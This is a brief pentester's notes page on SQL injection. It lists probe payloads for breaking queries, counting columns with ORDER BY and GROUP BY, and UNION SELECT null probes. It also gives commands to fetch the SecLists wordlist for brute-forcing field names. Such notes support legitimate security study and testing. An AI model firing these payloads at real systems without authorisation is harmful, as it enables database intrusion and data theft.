# SQL Injection





{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection" %}



**List**

```
'
"
`
')
")
`)
'))
"))
`))
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 4--+
1' GROUP BY 1--+
1' GROUP BY 2--+
1' GROUP BY 3--+
1' GROUP BY 4--+
1' UNION SELECT null-- -
1' UNION SELECT null,null-- -
1' UNION SELECT null,null,null-- -
1' UNION SELECT null,null,null,null-- -
1' UNION SELECT null,null,null,null,null-- -
```



## Bruteforce fields

Good wordlist to use. You would do this if you discovered one field already, than you just replace it(in the example below you change password) with your list.&#x20;

```
git clone https://github.com/danielmiessler/SecLists.git
ls /SecLists/Discovery/Web-Content/common.txt
```

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>





